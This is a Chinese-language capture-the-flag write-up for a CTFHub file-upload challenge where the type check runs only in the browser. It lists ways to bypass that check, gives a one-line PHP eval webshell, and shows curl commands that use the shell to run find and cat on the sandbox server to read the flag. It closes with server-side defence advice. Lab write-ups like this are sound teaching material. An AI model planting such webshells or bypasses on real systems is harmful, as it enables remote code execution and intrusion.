---
title: CTFHub 文件上传-前端验证
date: 2026-10-21
categories: CTFHub Web 文件上传
tags: CTFHub Web 文件上传
---
# 题目：CTFHub 文件上传-前端验证

## 题目描述
打开题目页面，界面：
- 一个文件选择按钮 `Filename: 选择文件`
- 一个 `Submit` 上传按钮

## 解题思路
尝试上传 `shell.php`，结果弹窗提示： > 该文件不允许上传
**分析：** 页面甚至没有发出 HTTP 请求，就直接拦截了。这说明校验发生在前端（浏览器里），而不是后端（服务器上）。

### 漏洞原理
前端的校验是在浏览器中执行的 JavaScript 代码。由于代码在用户可控的客户端运行，**任何前端校验都是不安全的，也是可以被绕过的。**
**常见的绕过方式：**
1. 禁用浏览器的 JavaScript。
2. 修改前端 HTML 源码，删掉校验属性。
3. 在控制台执行 JS，把校验函数覆盖掉。
4. 抓包修改请求（将 `.jpg` 修改为 `.php`）。

### 3查看源码

按 `F12` 打开开发者工具，查看元素代码：
```html
<form action="" method="post" enctype="multipart/form-data" onsubmit="return checkfilesuffix()">
```
可以看到表单有一个 onsubmit 事件，调用了 checkfilesuffix() 函数进行拦截。

## 解题步骤
1. 编写 PHP 木马
新建 shell.php，内容如下：
```php
<?php @eval($_POST['cmd']); ?>
```

2. 绕过前端验证
按 F12 切换到 元素 (Elements)。双击 <form ...> 标签，把 onsubmit="return checkfilesuffix()" 删掉。
直接上传 shell.php。

3. 访问木马执行命令
上传成功后，拿到路径 upload/shell.php。
在 CMD 中执行：
```cmd
curl -X POST http://challenge-xxx.sandbox.ctfhub.com:10800/upload/shell.php -d "cmd=system('find / -name *flag* 2>/dev/null');"
```

4. 读取 flag
找到 flag 路径后，执行：
```cmd
curl -X POST http://challenge-xxx.sandbox.ctfhub.com:10800/upload/shell.php -d "cmd=system('cat /var/www/html/flag_xxx.php');"
```
得到 flag

## 踩坑指南
1. 找不到禁用 JavaScript 的按钮
原因： 新版 Chrome/Edge 浏览器的开发者工具改名了，Disable JavaScript 选项被藏得很深。
解决： 不要折腾禁用了，直接在控制台执行 document.querySelector('form').onsubmit = function() { return true; }; 覆盖掉校验。

2. F12 里找不到“负载 (Payload)”面板
原因： 浏览器版本或汉化原因，有些面板叫“请求正文”。
解决： 别在面板里死磕，直接右键请求选择“复制为 cURL”，然后粘贴到 CMD 里把 shell.jpg 改成 shell.php 再执行。

## 知识点总结
1. 

| 知识点 | 说明 |
| :--- | :--- |
| 前端验证 | 在浏览器执行的 JS 校验，用户完全可控 |
| 控制台覆盖 | 用 `document.querySelector` 直接修改表单行为 |
| 源码篡改 | 用 F12 直接删除 `onsubmit` 属性 |
| 抓包改包 | 拦截 HTTP 请求，把后缀改回 `.php` |

2. 防御建议
   1. 永远不要信任前端：前端验证只防君子不防小人，必须在服务端做严格校验。
   2. 白名单限制：服务端严格检查文件后缀、MIME 类型和文件头。
   3. 禁止脚本执行：上传目录配置禁止解析 PHP。
